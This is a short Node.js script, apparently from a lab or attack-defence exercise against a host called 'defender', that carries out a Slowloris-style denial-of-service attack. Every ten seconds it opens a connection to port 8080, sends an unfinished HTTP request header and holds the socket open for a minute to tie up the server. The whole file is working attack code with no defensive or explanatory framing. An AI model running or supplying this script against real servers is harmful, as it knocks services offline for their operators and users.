
const net = require('net');
const target = { address: 'defender', port: 8080 };

const sendPartialRequest = () => {
    const socket = net.createConnection(target.port, target.address, () => {
        socket.write('GET / HTTP/1.1\r\nHost: defender\r\n');
        setTimeout(() => socket.end(), 60000);
    });
};

setInterval(sendPartialRequest, 10000);
